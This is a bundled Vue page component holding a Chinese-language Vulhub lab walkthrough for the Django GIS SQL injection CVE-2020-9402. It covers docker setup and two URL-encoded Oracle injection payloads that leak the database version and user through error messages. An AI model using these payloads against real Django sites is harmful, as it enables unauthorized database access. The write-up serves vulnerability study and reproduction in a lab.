import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as d,c as r,a as e,b as a,d as i,e as s}from"./app-58e4a7d6.js";const c={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),u=e("p",null,"Django 在 2020 年 3 月 4 日发布了一个安全更新，修复了在 GIS 查询功能中存在的 SQL 注入漏洞。",-1),h=e("p",null,"参考链接：",-1),p={href:"https://www.djangoproject.com/weblog/2020/mar/04/security-releases/",target:"_blank",rel:"noopener noreferrer"},_=s(`<p>该漏洞需要开发者使用了 GIS 中聚合查询的功能，用户在 oracle 的数据库且可控 tolerance 查询时的键名，在其位置注入 SQL 语句。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令编译及启动一个存在漏洞的 Django 3.0.3：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8000</code> 即可看到 Django 默认首页。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="漏洞一" tabindex="-1"><a class="header-anchor" href="#漏洞一" aria-hidden="true">#</a> 漏洞一</h3><p>首先访问 <code>http://your-ip:8000/vuln/</code>。</p><p>在该网页中使用 <code>get</code> 方法构造 <code>q</code> 的参数，构造 SQL 注入的字符串 <code>20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可见，括号已注入成功，SQL 语句查询报错：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/1.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="漏洞二" tabindex="-1"><a class="header-anchor" href="#漏洞二" aria-hidden="true">#</a> 漏洞二</h3><p>访问 <code>http://your-ip:8000/vuln2/</code>。 在该网页中使用 <code>get</code> 方法构造 <code>q</code> 的参数，构造出 SQL 注入的字符串 <code>0.05))) FROM &quot;VULN_COLLECTION2&quot; where (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null --</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8000/vuln2/?q=0.05)))%20FROM%20%22VULN_COLLECTION2%22%20%20where%20%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20not%20null%20%20--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/2.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16);function g(m,v){const t=o("ExternalLinkIcon");return d(),r("div",null,[l,u,h,e("ul",null,[e("li",null,[e("a",p,[a("https://www.djangoproject.com/weblog/2020/mar/04/security-releases/"),i(t)])])]),_])}const x=n(c,[["render",g],["__file","Django GIS SQL注入漏洞 CVE-2020-9402.html.vue"]]);export{x as default};
